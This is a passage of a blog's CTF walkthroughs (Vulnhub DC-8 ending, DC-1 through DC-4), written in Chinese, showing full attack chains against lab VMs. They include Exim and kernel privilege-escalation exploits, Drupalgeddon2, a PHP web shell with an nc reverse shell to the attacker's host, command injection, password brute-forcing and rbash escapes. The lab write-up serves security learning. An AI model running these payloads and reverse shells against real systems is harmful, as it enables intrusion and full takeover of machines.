[...] # $ ./raptor_exim_wiz -m setuid # Preparing setuid shell helper... # Delivering setuid payload... # [...] # Waiting 5 seconds... # -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned # # id # uid=0(root) gid=0(root) groups=0(root) # # Usage (netcat method): # $ id # uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...] # $ ./raptor_exim_wiz -m netcat # Delivering netcat payload... # Waiting 5 seconds... # localhost [127.0.0.1] 31337 (?) open # id # uid=0(root) gid=0(root) groups=0(root) 尝试过程中，第一种方法提权失败 www-data@dc-8:/tmp$ ./raptor_exim_wiz.sh -m setuid ./raptor_exim_wiz.sh -m setuid ./raptor_exim_wiz.sh: line 1: m_wiz: command not found raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; Preparing setuid shell helper... Problems compiling setuid shell helper, check your gcc. Falling back to the /bin/sh method. Delivering setuid payload... 220 dc-8 ESMTP Exim 4.89 Tue, 01 Oct 2019 08:26:09 +1000 250 dc-8 Hello localhost [::1] 250 OK 250 Accepted 354 Enter message, ending with &quot;.&quot; on a line by itself 250 OK id=1iF47N-0000O7-Uz 221 dc-8 closing connection Waiting 5 seconds... -rwxr-xr-x 1 www-data www-data 117208 Oct 1 08:26 /tmp/pwned $ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) 尝试第二种方式时成功了，直接拿到了root权限，拿下flag Ps:此处当然也可以反弹shell到Kali上 www-data@dc-8:/tmp$ ./raptor_exim_wiz.sh -m netcat ./raptor_exim_wiz.sh -m netcat ./raptor_exim_wiz.sh: line 1: m_wiz: command not found raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; Delivering netcat payload... 220 dc-8 ESMTP Exim 4.89 Tue, 01 Oct 2019 08:27:59 +1000 250 dc-8 Hello localhost [::1] 250 OK 250 Accepted 354 Enter message, ending with &quot;.&quot; on a line by itself 250 OK id=1iF499-0000Oj-KW 221 dc-8 closing connection Waiting 5 seconds... localhost [127.0.0.1] 31337 (?) open id uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim) cd /root ls flag.txt cat flag.txt Brilliant - you have succeeded!!! 888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 &quot;Y88b 888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888 888d88888b888 d8P Y8b 888 888 888 888 d88&quot;&quot;88b 888 &quot;88b d8P Y8b 888 888 888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. &quot; &quot; &quot; &quot; 888P Y888 &quot;Y8888 888 888 8888888P&quot; &quot;Y88P&quot; 888 888 &quot;Y8888 888 888 888 888 Hope you enjoyed DC-8. Just wanted to send a big thanks out there to all those who have provided feedback, and all those who have taken the time to complete these little challenges. I&#39;m also sending out an especially big thanks to: @4nqr34z @D4mianWayne @0xmzfr @theart42 This challenge was largely based on two things: 1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile. 2. A suggestion from @theart42 The answer to that question is... If you enjoyed this CTF, send me a tweet via @DCAU7. Reference https://www.anquanke.com/post/id/178958 http://lanbainan.cn/2019/05/30/2019-05-30/ https://diaryof0x41.wordpress.com/2019/05/29/vulnhub-dc-6-walkthrough/ https://www.hackingarticles.in/dc7-vulnhub-walkthrough/ https://www.hackingarticles.in/dc8-vulnhub-walkthrough/","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"DC-1至DC-4靶机渗透测试","slug":"DC1-DC4靶机渗透测试","date":"2019-09-16T16:00:00.000Z","updated":"2019-10-19T12:41:17.289Z","comments":true,"path":"2019/09/17/DC1-DC4靶机渗透测试/","link":"","permalink":"https://knlvre.github.io/2019/09/17/DC1-DC4靶机渗透测试/","excerpt":"","text":"前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC-1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道 由于IP也不知道，所以没有目标下手，所以需要获取靶机的IP地址。Kali上使用Nmap扫描本网段下的所有主机 先查看Kali所处的网段 ifconfig Nmap通过Ping方法扫描网段内所有主机，排除掉其他IP，找到目标靶机（192.168.43.27） nmap -sP 192.168.43.0/24 扫描主机开放的端口 Ps：-sV，版本探测。版本探测不是进行端口扫描，而是通过相应的端口对应的服务，根据服务指纹识别出相应的版本 nmap -sV 192.168.43.27 既然开放了http服务的80端口，那现在就直接用浏览器访问一下 发现是典型的Drupal Site，那就可以启动Metersploit来帮助渗透 msfconsole 搜索drupal的模块 search drupal 使用2018-03-28的测试，成功 use exploit/unix/webapp/drupal_drupalgeddon2 set rhosts 192.168.43.27 run 获取shell shell 使用Python反弹回一个交互式shell python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; 在当前目录下（网页根目录/var/www/）发现flag1.txt，查看后给出提示： Every good CMS needs a config file - and so do you. 既然提示我们网站配置文件，那就到/var/www/sites/default目录下，查看cat settings.php文件，发现了flag2 并且提示： Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access).What can you do with these credentials? 大意应该就是我们能用当前配置文件下的信息做一些什么呢？注意到提示下面有数据库的账号密码，所以我们可以拿着这个去登录数据库 尝试登录数据库，成功 mysql -u dbuser -p R0ck3t 查看drupal库-users表，发现了admin的账号密码，但是密码经过加密 现在可以选择修改掉admin的密码，但是密码经过特殊算法加密，如果不按照它的加密规则修改，查询的时候还是会不正确，所以就必须按照加密规则加密然后去修改。参考文章：http://drupalchina.cn/node/2128 退出数据库，切换到网站根目录下 \\q cd /var/www php scripts/password-hash.sh [123456] 再次进入数据库，将刚才返回的hash值拿去替换为admin的密码 update users set pass=&quot;$S$DpO/2yRe.nB1y8WswwIgYPp/hxooDcHaPXrEW33ERy9o5ox2jLwa&quot; where name=&quot;admin&quot;; select * from users; 更改完后，现在用户admin的密码就变为123456了，回到网站中尝试登陆，果然成功了 并且在Dashboard模块找到了flag3，提示： Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow. flag3提示我们提权（PERMS）、FIND命令、-exec。既然涉及到提权，那么下一个flag应该是需要相应的权限才能查看，可以搜索一下flag关键字 find / -name &quot;flag*&quot; 找到了/home/flag4目录下的flag4.txt，查看后给出了提示： Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy. Or maybe it is? 提示我们/root下有下一个flag，但是尝试进入时，被拒绝了，只有root能访问 cd /root cd / ls -l 现在就需要提权了，根据flag3的提示，本次使用具有SUID的命令来提权，先找一下具有SUID（4000）权限的命令，可以发现find命令就有4000权限 find / -perm -4000 现在就可以利用find命令来提权，直接获得root权限 cd /var/www touch ti_quan find / -name ti_quan -exec &quot;whoami&quot; \\; 弹出root权限的shell，查看/root下的flag了 Ps：注意此处&quot;/bin/sh&quot;才会是root权限，如果换成&quot;/bin/bash&quot;就还会是www-data权限 find / -name ti_quan -exec &quot;/bin/sh&quot; \\; cd \\root cat thefinalflag.txt 看了参考的文章，知道本靶机还有一个玩法，就是用hydra去爆破flag4用户的密码，先介绍参数： -l [指定用户名] -P [加载自定义的密码字典] ssh://[ip] 指定使用的协议和IP 先自己创建password.txt，然后使用hydra（由于我换了网络，所以IP改一下） hydra -l flag4 -P password.txt ssh://192.168.43.27 爆破出密码为orange，用ssh去连接登录 ssh flag4@192.168.43.27 DC-2环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84或192.168.2.107） 靶机：DC-2（IP：192.168.43.10或192.168.2.109） 渗透测试打开DC2靶机之后，照样利用Nmap扫描攻击机的网段，找到DC2的IP地址之后，扫描DC2的端口开放情况 nmap -sP 192.168.43.0/24 nmap -sV 192.168.43.10 扫描结果显示开放80端口，但是访问时却访问不了，用-A选项扫一下 nmap -A 192.168.43.10 修改hosts文件 vi /etc/hosts cat /etc/hosts 再次浏览器访问，发现是WordPress的站，并且发现flag1，提示： Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl. More passwords is always better, but sometimes you just can’t win them all. Log in as one to see the next flag. If you can’t find it, log in as another. 根据提示的内容，应该是要我们去获取后台的用户和密码 首先，用Kali内的工具wpscan（WordPress漏洞扫描器）获取用户名 Ps：-e u作用是枚举用户 wpscan --url http://dc-2/ -e u 从扫描结果可以看出来，一共扫描出三个用户：admin、jerry、tom。创建文本dc2_users.txt，将三个用户写入其中 接下来，使用Kali内的工具cewl扫描网站，获取可能的密码 Ps：-w参数用来将扫描结果输出到文件内 cewl http://dc-2/ -w dc2_passwords.txt 现在有了用户名和密码，可以利用刚才生成的dc2_users.txt和dc2_passwords.txt去爆破。有两种方法：1.wpscan 2.hydra 方法一：wpscan wpscan --url http://dc-2/ -U dc2_users -P dc2_passwords.txt 方法二：hydra 由于hydra不行wpscan是专门针对WordPress的漏洞扫描工具，所以需要提供登录的页面（wp-login.php）、提交表单的方式（POST）以及表单的数据（log、pwd等等） hydra -L dc2_users.txt -P dc2_passwords.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39; 现在得到了jerry和tom的用户名和密码，登录jerry账户，拿到了flag2，提示： If you can’t exploit WordPress and take a shortcut, there is another way. Hope you found another entry point. 重新扫描靶机的所有端口，扫到7744端口（raqmon-pdu） nmap -p1-65535 192.168.43.10 ssh连接，tom的账号 Ps：由于这里端口不是22号端口，所以需要指定端口 ssh tom@192.168.43.10 -p 7744 连接成功，但是碰到了rbash (restricited Bash)，许多命令都被禁用了 用vi命令绕过受限的shell vi flag3.txt :set shell=/bin/bash :shell export -p # export PATH=$PATH:/bin/ # export -p tom@DC-2:~$ export PATH=$PATH:/bin/ tom@DC-2:~$ export -p declare -x HOME=&quot;/home/tom&quot; declare -x LANG=&quot;en_US.UTF-8&quot; declare -x LOGNAME=&quot;tom&quot; declare -x MAIL=&quot;/var/mail/tom&quot; declare -x OLDPWD declare -x PATH=&quot;/home/tom/usr/bin:/bin/&quot; #此处加入了/bin/ declare -x PWD=&quot;/home/tom&quot; declare -x SHELL=&quot;/bin/rbash&quot; declare -x SHLVL=&quot;2&quot; declare -x SSH_CLIENT=&quot;192.168.2.107 45502 7744&quot; declare -x SSH_CONNECTION=&quot;192.168.2.107 45502 192.168.2.109 7744&quot; declare -x SSH_TTY=&quot;/dev/pts/0&quot; declare -x TERM=&quot;xterm-256color&quot; declare -x USER=&quot;tom&quot; declare -x VIM=&quot;/usr/share/vim&quot; declare -x VIMRUNTIME=&quot;/usr/share/vim/vim74&quot; 此时就绕过了限制，可以查看flag3.txt的内容 #cat flag3.txt tom@DC-2:~$ cat flag3.txt Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 提示如下 Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 根据提示，我们此时切换到jerry用户 # su jerry # adipiscing # cd /home/jerry/ # ls # cat flag4.txt tom@DC-2:~$ su jerry Password: jerry@DC-2:/home/tom$ cd /home/jerry/ jerry@DC-2:~$ ls flag4.txt jerry@DC-2:~$ cat flag4.txt Good to see that you&#39;ve made it this far - but you&#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you&#39;re on your own now. :-) Go on - git outta here!!!! 提示如下 Good to see that you’ve made it this far - but you’re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you’re on your own now. :-) Go on - git outta here!!!! 表面上说没有提示，但是最后一句话有git单词，提示我们利用git提权。提权成功后，拿到了最后的flag # sudo git -p help config # !/bin/sh # id # cd ~ # ls # cat final-flag.txt jerry@DC-2:~$ sudo git -p help config GIT-CONFIG(1) ... NAME git-config - Get and set repository or global options SYNOPSIS git config [&lt;file-option&gt;] [type] [-z|--null] name [value [value_regex]] git config [&lt;file-option&gt;] [type] --add name value ... DESCRIPTION You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the ... expansion (see --path below). If no type specifier is passed, no checks or transformations are performed on the value. !/bin/sh # id uid=0(root) gid=0(root) groups=0(root) # cd ~ # ls final-flag.txt # cat final-flag.txt __ __ _ _ _ _ / / /\\ \\ \\___| | | __| | ___ _ __ ___ / \\ \\ \\/ \\/ / _ \\ | | / _` |/ _ \\| &#39;_ \\ / _ \\/ / \\ /\\ / __/ | | | (_| | (_) | | | | __/\\_/ \\/ \\/ \\___|_|_| \\__,_|\\___/|_| |_|\\___\\/ Congratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it&#39;s all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7. DC-3环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-3（IP：192.168.43.134） 渗透测试nmap扫描靶机，发现只开启了80端口，浏览器访问 利用前段时间学长给的工具gwhatweb，知道了网站框架是Joomla(逐浪) # python gwhatweb.py http://192.168.43.134/ root@Knlvre:~/桌面/gwhatweb-master# python gwhatweb.py http://192.168.43.134/ webdata total:1421 CMS:Joomla(逐浪) Judge:http://192.168.43.134/administrator/components/com_login/login.xml re:joomla CMS:Joomla(逐浪) Judge:http://192.168.43.134/components/com_wrapper/wrapper.xml re:joomla CMS:Joomla(逐浪) Judge:http://192.168.43.134/README.txt re:joomla CMS:Joomla(逐浪) Judge:http://192.168.43.134/plugins/authentication/joomla/joomla.xml re:joomla CMS:Joomla(逐浪) Judge:http://192.168.43.134/modules/mod_banners/mod_banners.xml re:joomla CMS:Joomla(逐浪) Judge:http://192.168.43.134/robots.txt.dist re:joomla cost: 4.991101 s 使用Joomla框架扫描工具Joomblah扫描网站 # python joomblah.py http://192.168.43.134/ root@Knlvre:~/桌面/exploits/Joomblah# python joomblah.py http://192.168.43.134/ .---. .-&#39;&#39;&#39;-. .-&#39;&#39;&#39;-. | | &#39; _ \\ &#39; _ \\ .---. &#39;---&#39; / /` &#39;. \\ / /` &#39;. \\ __ __ ___ /| | | . .---.. | \\ &#39; . | \\ &#39; | |/ `.&#39; `. || | | .&#39;| | || &#39; | &#39;| &#39; | &#39;| .-. .-. &#39;|| | | &lt; | | |\\ \\ / / \\ \\ / / | | | | | ||| __ | | __ | | | | `. ` ..&#39; / `. ` ..&#39; / | | | | | |||/&#39;__ &#39;. | | .:--.&#39;. | | .&#39;&#39;&#39;-. | | &#39;-...-&#39;` &#39;-...-&#39;` | | | | | ||:/` &#39;. &#39;| |/ | \\ | | |/.&#39;&#39;&#39;. \\ | | | | | | | ||| | || |`&quot; __ | | | / | | | | |__| |__| |__|||\\ / &#39;| | .&#39;.&#39;&#39;| | | | | | __.&#39; &#39; |/&#39;..&#39; / &#39;---&#39;/ / | |_| | | | | &#39; &#39; `&#39;-&#39;` \\ \\._,\\ &#39;/| &#39;. | &#39;. |____.&#39; `--&#39; `&quot; &#39;---&#39; &#39;---&#39; [-] Fetching CSRF token [-] Testing SQLi - Found table: d8uea_users - Found table: users - Extracting users from d8uea_users [$] Found user [&#39;629&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;freddy@norealaddress.net&#39;, &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39;, &#39;&#39;, &#39;&#39;] - Extracting sessions from d8uea_session - Extracting users from users - Extracting sessions from session 得到一串hash密码， 用john工具爆破一下得到密码：snoopy # vi hash.txt # 填入$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu # john hash.txt root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# vi hash.txt root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# john hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Proceeding with single, rules:Single Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist snoopy (?) 1g 0:00:00:02 DONE 2/3 (2019-09-23 09:06) 0.4830g/s 17.39p/s 17.39c/s 17.39C/s mustang..buster Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed Ps：第一次使用john，当重复爆破一个文件时，会出现以下提示 root@Knlvre:~# john hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) No password hashes left to crack (see FAQ) #提示 百度之后才知道，john不会再执行爆破过的文件，如果出现如上提示，可以加--show参数查看文件，就能看到破解情况 root@Knlvre:~# john --show hash.txt ?:snoopy 1 password hash cracked, 0 left dirsearch扫描出后台/administrator/ [09:57:08] 200 - 5KB - /administrator/ [09:57:08] 200 - 5KB - /administrator/index.php [09:57:08] 301 - 329B - /administrator/logs -&gt; http://192.168.43.134/administrator/logs/ [09:57:11] 301 - 314B - /bin -&gt; http://192.168.43.134/bin/ [09:57:11] 200 - 31B - /bin/ [09:57:11] 301 - 316B - /cache -&gt; http://192.168.43.134/cache/ [09:57:11] 200 - 31B - /cache/ [09:57:12] 301 - 321B - /components -&gt; http://192.168.43.134/components/ [09:57:13] 200 - 0B - /configuration.php [09:57:17] 200 - 3KB - /htaccess.txt [09:57:18] 301 - 317B - /images -&gt; http://192.168.43.134/images/ [09:57:18] 301 - 319B - /includes -&gt; http://192.168.43.134/includes/ [09:57:18] 200 - 31B - /includes/ [09:57:18] 200 - 7KB - /index.php [09:57:20] 301 - 319B - /language -&gt; http://192.168.43.134/language/ [09:57:20] 301 - 320B - /libraries -&gt; http://192.168.43.134/libraries/ [09:57:20] 200 - 18KB - /LICENSE.txt [09:57:21] 301 - 316B - /media -&gt; http://192.168.43.134/media/ [09:57:22] 301 - 318B - /modules -&gt; http://192.168.43.134/modules/ [09:57:25] 301 - 318B - /plugins -&gt; http://192.168.43.134/plugins/ [09:57:26] 200 - 4KB - /README.txt [09:57:27] 403 - 302B - /server-status [09:57:27] 403 - 303B - /server-status/ [09:57:31] 200 - 31B - /templates/ [09:57:31] 301 - 320B - /templates -&gt; http://192.168.43.134/templates/ [09:57:32] 301 - 314B - /tmp -&gt; http://192.168.43.134/tmp/ [09:57:32] 200 - 31B - /tmp/ [09:57:33] 200 - 2KB - /web.config.txt 访问后，用admin的密码成功登陆 选择Configuration -&gt; Templates -&gt; Templates -&gt; Protostar Details and Files -&gt; New File，创建shell.php 插入反弹shell命令 &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.84 3737 &gt;/tmp/f&#39;); ?&gt; 写完保存之后，我们先用nc监听3737端口 root@Knlvre:~# nc -lvp 3737 listening on [any] 3737 ... 然后访问shell.php http://192.168.43.134/templates/protostar/shell.php 在查看终端时，就拿到了shell，但是该用户并没有什么权限，无法切换到~目录下，准备提权 root@Knlvre:~# nc -lvp 3737 listening on [any] 3737 ... connect to [192.168.43.84] from DC3VM [192.168.43.134] 44292 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami www-data 查看版本 $ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 16.04 LTS Release: 16.04 Codename: xenial 使用searchsploit查看关键字Ubuntu和16.04的漏洞 searchsploit Ubuntu 16.04 使用exploits/linux/local/39772.txt，通过-m参数复制到当前目录下 root@Knlvre:~# searchsploit -m exploits/linux/local/39772.txt Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation URL: https://www.exploit-db.com/exploits/39772 Path: /usr/share/exploitdb/exploits/linux/local/39772.txt File Type: C source, ASCII text, with CRLF line terminators Copied to: /root/39772.txt 查看39772.txt可以看到介绍用法 root@Knlvre:~# tail -20 39772.txt An exploit that puts all this together is in exploit.tar. Usage: user@host:~/ebpf_mapfd_doubleput$ ./compile.sh user@host:~/ebpf_mapfd_doubleput$ ./doubleput starting writev woohoo, got pointer reuse writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds. suid file detected, launching rootshell... we have root privs now... root@host:~/ebpf_mapfd_doubleput# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user) This exploit was tested on a Ubuntu 16.04 Desktop system. Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7 Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552 Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip 注意到上面的这个Exploit-DB Mirror，下载这个zip文件到靶机上 $ pwd /var/www/html/templates/protostar $ ls component.php css ... $ mkdir 39772 $ cd 39772 $ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip --2019-09-23 16:01:08-- https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip ... 2019-09-23 16:01:10 (4.38 MB/s) - &#39;39772.zip&#39; saved [7025/7025] $ ls 39772.zip $ unzip 39772.zip Archive: 39772.zip creating: 39772/ inflating: 39772/.DS_Store creating: __MACOSX/ creating: __MACOSX/39772/ inflating: __MACOSX/39772/._.DS_Store inflating: 39772/crasher.tar inflating: __MACOSX/39772/._crasher.tar inflating: 39772/exploit.tar inflating: __MACOSX/39772/._exploit.tar $ ls 39772 39772.zip __MACOSX $ cd 39772 $ ls crasher.tar exploit.tar $ tar -xvf exploit.tar ebpf_mapfd_doubleput_exploit/ ebpf_mapfd_doubleput_exploit/hello.c ebpf_mapfd_doubleput_exploit/suidhelper.c ebpf_mapfd_doubleput_exploit/compile.sh ebpf_mapfd_doubleput_exploit/doubleput.c $ ls crasher.tar ebpf_mapfd_doubleput_exploit exploit.tar $ cd ebpf_mapfd_doubleput_exploit $ ls compile.sh doubleput.c hello.c suidhelper.c $ ./compile.sh doubleput.c: In function &#39;make_setuid&#39;: doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast] .insns = (__aligned_u64) insns, ^ doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast] .license = (__aligned_u64)&quot;&quot; ^ $ ls compile.sh doubleput doubleput.c hello hello.c suidhelper suidhelper.c $ ./doubleput starting writev woohoo, got pointer reuse writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds. suid file detected, launching rootshell... we have root privs now... id uid=0(root) gid=0(root) groups=0(root),33(www-data) 执行compile.sh的过程中好像报错了，但是不要紧，还是生成了doubleput，执行后拿到了root权限，拿到了flag cd ~ ls the-flag.txt cat the-flag.txt __ __ _ _ ____ _ _ _ _ \\ \\ / /__| | | | _ \\ ___ _ __ ___| | | | | \\ \\ /\\ / / _ \\ | | | | | |/ _ \\| &#39;_ \\ / _ \\ | | | | \\ V V / __/ | | | |_| | (_) | | | | __/_|_|_|_| \\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_) Congratulations are in order for completing DC-3VM. :-) I hope you&#39;ve enjoyed this challenge as much as I enjoyed making it. If there are any ways that I can improve these little challenges, please let me know. As per usual, comments and complaints can be sent via Twitter to @DCAU7 Have a great day!!!! DC-4环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-4（IP：192.168.43.193） 渗透测试nmap扫描靶机，发现开启了22和80端口 root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 14:20 CST Nmap scan report for dc-4 (192.168.43.193) Host is up (0.00069s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA) | 256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA) |_ 256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519) 80/tcp open http nginx 1.15.10 |_http-server-header: nginx/1.15.10 |_http-title: System Tools MAC Address: 00:0C:29:CA:EC:58 (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 0.69 ms dc-4 (192.168.43.193) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds 访问80端口，是一个登录页面，没有次数、验证码之类的限制 查看源码，hydra爆破 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;System Tools&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/styles.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;h2&gt;Admin Information Systems Login&lt;/h2&gt; &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt; Username:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot;&gt;&lt;p&gt; Password:&lt;br&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;&gt;&lt;p&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; root@Knlvre:/usr/share/wordlists# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.193 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot; Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 14:38:45 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://192.168.43.193:80/login.php:username=^USER^&amp;password=^PASS^:S=logout [80][http-post-form] host: 192.168.43.193 login: admin password: happy 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 14:39:01 获得用户名admin - 密码happy。登录之后可以进行3个操作：ls -l、du -h、df -h，可能存在命令执行漏洞 抓包，发现可以直接修改要执行的命令并直接执行 现在直接通过nc命令反弹一个shell radio=nc -e /bin/sh 192.168.43.84 3737&amp;submit=Run 如果不支持-e参数，也可以创建远程shell，命令与DC3中一样，但是此处好像不行，到2&gt;处就断了，不再去看 意义：创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口3737上。至此，我们已经把netcat的输出重定向到fifo文件中。 说明：从网络收到的输入写到fifo文件中，cat 命令读取fifo文件并且其内容发送给sh命令，sh命令进程受到输入并把它写回到netcat。netcat 通过网络发送输出到client 至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh 2&gt;&amp;1 | nc 192.168.43.84 3737 &gt; /tmp/f 回归正题，拿到shell之后，切换到/home目录下，发现有3个用户charles,jim,sam，只有jim目录下有东西，在/home/jim/backups/目录下发现密码文件old-passwords.bak，里面存放着很多密码，除此之外没有其他有用信息。回到上级目录，发现mbox其他人没有权限读，十分可疑。那应该就是要获取jim的密码，ssh登录然后查看了 将密码文件复制下来写入dc4_passwords.txt，前面扫描端口发现还开放22号端口，那么接下来就用hydra爆破ssh root@Knlvre:~# hydra -l jim -P dc4_passwords.txt ssh://192.168.43.193 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 16:10:00 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task [DATA] attacking ssh://192.168.43.193:22/ [STATUS] 177.00 tries/min, 177 tries in 00:01h, 76 to do in 00:01h, 16 active [22][ssh] host: 192.168.43.193 login: jim password: jibril04 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 1 final worker threads did not complete until end. [ERROR] 1 target did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 16:11:48 ssh登录成功，查看mbox root@Knlvre:~# ssh jim@192.168.43.193 The authenticity of host &#39;192.168.43.193 (192.168.43.193)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;192.168.43.193&#39; 